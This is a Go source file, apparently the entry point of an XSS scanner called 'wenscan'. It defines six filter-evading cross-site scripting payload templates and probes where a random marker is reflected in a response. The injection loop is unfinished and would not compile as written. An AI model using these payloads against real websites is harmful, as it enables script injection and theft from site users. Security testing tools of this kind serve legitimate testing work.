package main

import (
	"fmt"
	Helper "wenscan/Helper"
	httpex "wenscan/Http"
	log "wenscan/Log"
	"wenscan/Xss"
)

var (
	script_payload  string = "<ScRiPt>%s</sCrIpT>"
	img_payload     string = "<iMg SrC=1 oNeRrOr=%s>"
	href_payload    string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
	svg_payload     string = "<sVg/OnLoAd=%s>"
	iframe_payload  string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
	input_payload   string = "<input autofocus onfocus=%s>"
	payload3_prompt string = "prompt(1)"
)
var payloads = []string{
	script_payload,
	img_payload,
	href_payload,
	svg_payload,
	iframe_payload,
	input_payload,
}

func main() {
	log.DebugEnable(true)
	playload := Xss.RandStringRunes(12)
	html := httpex.Sendreq("", playload)
	locations := Helper.SearchInputInResponse(playload, *html)
	log.Info("CURRNET", locations)
	if len(locations) == 0 {
		log.Error("SearchInputInResponse error,U can convert html encode")
	}
	for _, tag := range payloads {
		for _, item := range locations {
			if item.Type == "html" {
				//xss真正标签加载攻击
				newpayload := fmt.Sprintf(tag, playload)

			}
		}
	}

}
